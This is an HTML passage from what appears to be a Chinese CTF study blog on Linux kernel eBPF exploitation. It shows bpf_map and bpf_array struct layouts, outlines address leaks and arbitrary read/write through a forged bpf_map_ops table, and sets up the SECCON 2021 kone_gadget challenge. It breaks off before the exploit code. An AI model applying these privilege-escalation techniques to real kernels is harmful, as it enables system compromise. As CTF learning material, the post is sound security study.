</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_array</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">bpf_map</span>             <span class="n">map</span><span class="p">;</span>                  <span class="cm">/*     0   240 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* --- cacheline 3 boundary (192 bytes) was 48 bytes ago --- */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">elem_size</span><span class="p">;</span>            <span class="cm">/*   240     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">index_mask</span><span class="p">;</span>           <span class="cm">/*   244     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">bpf_array_aux</span> <span class="o">*</span>     <span class="n">aux</span><span class="p">;</span>                  <span class="cm">/*   248     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* --- cacheline 4 boundary (256 bytes) --- */</span>
</span></span><span class="line"><span class="cl">        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="n">__empty_value</span><span class="p">;</span>                 <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                        <span class="kt">char</span>       <span class="n">value</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>             <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>                                       <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="n">__empty_ptrs</span><span class="p">;</span>                  <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                        <span class="kt">void</span> <span class="o">*</span>     <span class="n">ptrs</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>              <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>                                       <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="n">__empty_pptrs</span><span class="p">;</span>                 <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                        <span class="kt">void</span> <span class="o">*</span>     <span class="n">pptrs</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>             <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>                                       <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>                                               <span class="cm">/*   256     0 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* size: 256, cachelines: 4, members: 5 */</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>其中最重要的就是第一个成员：</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_map</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_map_ops</span>  <span class="o">*</span> <span class="n">ops</span><span class="p">;</span>                 <span class="cm">/*     0     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span>           <span class="n">inner_map_meta</span><span class="p">;</span>       <span class="cm">/*     8     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">void</span> <span class="o">*</span>                     <span class="n">security</span><span class="p">;</span>             <span class="cm">/*    16     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">enum</span> <span class="n">bpf_map_type</span>          <span class="n">map_type</span><span class="p">;</span>             <span class="cm">/*    24     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">key_size</span><span class="p">;</span>             <span class="cm">/*    28     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">value_size</span><span class="p">;</span>           <span class="cm">/*    32     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">max_entries</span><span class="p">;</span>          <span class="cm">/*    36     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u64</span>                        <span class="n">map_extra</span><span class="p">;</span>            <span class="cm">/*    40     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">map_flags</span><span class="p">;</span>            <span class="cm">/*    48     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">id</span><span class="p">;</span>                   <span class="cm">/*    52     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">btf_record</span> <span class="o">*</span>        <span class="n">record</span><span class="p">;</span>               <span class="cm">/*    56     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* --- cacheline 1 boundary (64 bytes) --- */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span>                        <span class="n">numa_node</span><span class="p">;</span>            <span class="cm">/*    64     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">btf_key_type_id</span><span class="p">;</span>      <span class="cm">/*    68     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">btf_value_type_id</span><span class="p">;</span>    <span class="cm">/*    72     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">u32</span>                        <span class="n">btf_vmlinux_value_type_id</span><span class="p">;</span> <span class="cm">/*    76     4 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">btf</span> <span class="o">*</span>               <span class="n">btf</span><span class="p">;</span>                  <span class="cm">/*    80     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">char</span>                       <span class="n">name</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>             <span class="cm">/*    88    16 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="n">mutex</span>               <span class="n">freeze_mutex</span><span class="p">;</span>         <span class="cm">/*   104    32 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* --- cacheline 2 boundary (128 bytes) was 8 bytes ago --- */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">atomic64_t</span>                 <span class="n">refcnt</span><span class="p">;</span>               <span class="cm">/*   136     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">atomic64_t</span>                 <span class="n">usercnt</span><span class="p">;</span>              <span class="cm">/*   144     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">struct</span> <span class="n">work_struct</span> <span class="n">work</span><span class="p">;</span>                 <span class="cm">/*   152    32 */</span>
</span></span><span class="line"><span class="cl">                <span class="k">struct</span> <span class="n">callback_head</span> <span class="n">rcu</span><span class="p">;</span>                <span class="cm">/*   152    16 */</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>                                               <span class="cm">/*   152    32 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">atomic64_t</span>                 <span class="n">writecnt</span><span class="p">;</span>             <span class="cm">/*   184     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* --- cacheline 3 boundary (192 bytes) --- */</span>
</span></span><span class="line"><span class="cl">        <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">const</span> <span class="k">struct</span> <span class="n">btf_type</span>  <span class="o">*</span> <span class="n">attach_func_proto</span><span class="p">;</span> <span class="cm">/*   192     8 */</span>
</span></span><span class="line"><span class="cl">                <span class="kt">spinlock_t</span>         <span class="n">lock</span><span class="p">;</span>                 <span class="cm">/*   200     4 */</span>
</span></span><span class="line"><span class="cl">                <span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">type</span><span class="p">;</span>                 <span class="cm">/*   204     4 */</span>
</span></span><span class="line"><span class="cl">                <span class="kt">bool</span>               <span class="n">jited</span><span class="p">;</span>                <span class="cm">/*   208     1 */</span>
</span></span><span class="line"><span class="cl">                <span class="kt">bool</span>               <span class="n">xdp_has_frags</span><span class="p">;</span>        <span class="cm">/*   209     1 */</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">owner</span><span class="p">;</span>                                         <span class="cm">/*   192    24 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* XXX last struct has 6 bytes of padding */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span>                       <span class="n">bypass_spec_v1</span><span class="p">;</span>       <span class="cm">/*   216     1 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span>                       <span class="n">frozen</span><span class="p">;</span>               <span class="cm">/*   217     1 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span>                       <span class="n">free_after_mult_rcu_gp</span><span class="p">;</span> <span class="cm">/*   218     1 */</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bool</span>                       <span class="n">free_after_rcu_gp</span><span class="p">;</span>    <span class="cm">/*   219     1 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* XXX 4 bytes hole, try to pack */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">atomic64_t</span>                 <span class="n">sleepable_refcnt</span><span class="p">;</span>     <span class="cm">/*   224     8 */</span>
</span></span><span class="line"><span class="cl">        <span class="n">s64</span> <span class="o">*</span>                      <span class="n">elem_count</span><span class="p">;</span>           <span class="cm">/*   232     8 */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="cm">/* size: 240, cachelines: 4, members: 29 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* sum members: 236, holes: 1, sum holes: 4 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* paddings: 1, sum paddings: 6 */</span>
</span></span><span class="line"><span class="cl">        <span class="cm">/* last cacheline: 48 bytes */</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p><code>bpf_map_ops</code>中存的是一系列虚表函数。通常，我们需要通过越界读写等手段，修改这个虚表</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// include/linux/bpf.h
</span></span></span><span class="line"><span class="cl"><span class="cm">/* map is generic key/value storage optionally accessible by eBPF programs */</span>
</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">bpf_map_ops</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// ...
</span></span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/* funcs callable from userspace and from eBPF programs */</span>
</span></span><span class="line"><span class="cl">	<span class="kt">void</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">map_lookup_elem</span><span class="p">)(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">map_update_elem</span><span class="p">)(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="n">u64</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">map_delete_elem</span><span class="p">)(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">map_push_elem</span><span class="p">)(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">,</span> <span class="n">u64</span> <span class="n">flags</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kt">long</span> <span class="p">(</span><span class="o">*</span><span class="n">map_pop_elem</span><span class="p">)(</span><span class="k">struct</span> <span class="n">bpf_map</span> <span class="o">*</span><span class="n">map</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">	<span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><ul>
<li>泄露地址：把<code>ops</code>写回<code>bpf_array</code>中的<code>values</code>域中，读出来即可</li>
<li>任意地址读写：在<code>values</code>中伪造一个<code>ops</code>，劫持<code>ops</code>指针指向这个伪造的<code>ops</code>，这样调用某个虚表函数其实是调用我们想要调用的函数</li>
</ul>
<p><code>helper function</code>是内核定义的函数，能被<code>ebpf</code>程序调用</p>
<p>重要的函数：</p>
<ul>
<li><code>bpf_map_lookup_elem</code>：</li>
</ul>
<h3 class="heading-element" id="模板"><span>模板</span>
  <a href="#%e6%a8%a1%e6%9d%bf" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h2 class="heading-element" id="例题"><span>例题</span>
  <a href="#%e4%be%8b%e9%a2%98" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h4 class="heading-element" id="sec-con-ctf-2021-kone_gadget"><span>SEC CON CTF 2021 kone_gadget</span>
  <a href="#sec-con-ctf-2021-kone_gadget" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">mkdir initramfs
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> initramfs
</span></span><span class="line"><span class="cl">cp ../rootfs.cpio .
</span></span><span class="line"><span class="cl">sudo cpio -idm &lt; ./rootfs.cpio
</span></span><span class="line"><span class="cl">rm rootfs.cpio</span></span></code></pre></td></tr></table></div>
</div>
</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-sh"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc exp.c -static -masm<span class="o">=</span>intel -g -o ./initramfs/exp
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ./initramfs
</span></span><span class="line"><span class="cl">sudo find . <span class="p">|</span> sudo cpio -o --format<span class="o">=</span>newc &gt;../rootfs.cpio
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ..</span></span></code></pre></td></tr></table></div>
</div>
</div><p>提供了一个新的系统调用，能控制rip，但是其他寄存器都置0</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Added to arch/x86/entry/syscalls/syscall_64.tbl:
</span></span><span class="line"><span class="cl">1337 64 seccon sys_seccon
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Added to kernel/sys.c:
</span></span><span class="line"><span class="cl">SYSCALL_DEFINE1(seccon, unsigned long, rip)
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  asm volatile(&#34;xor %%edx, %%edx;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%ebx, %%ebx;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%ecx, %%ecx;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%edi, %%edi;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%esi, %%esi;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r8d, %%r8d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r9d, %%r9d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r10d, %%r10d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r11d, %%r11d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r12d, %%r12d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r13d, %%r13d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r14d, %%r14d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%r15d, %%r15d;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%ebp, %%ebp;&#34;
</span></span><span class="line"><span class="cl">               &#34;xor %%esp, %%esp;&#34;
</span></span><span class="line"><span class="cl">               &#34;jmp %0;&#34;
</span></span><span class="line"><span class="cl">               &#34;ud2;&#34;
</span></span><span class="line"><span class="cl">               : : &#34;rax&#34;(rip));
</span></span><span class="line"><span class="cl">  return 0;
</span></span><span class="line"><span class="cl">}</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>大概思路就是往内核中写入一个one_gadget，调用它就能提权</p>
<p>同时，题目也禁掉了bpf系统调用</p>
<p>写了个exp:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
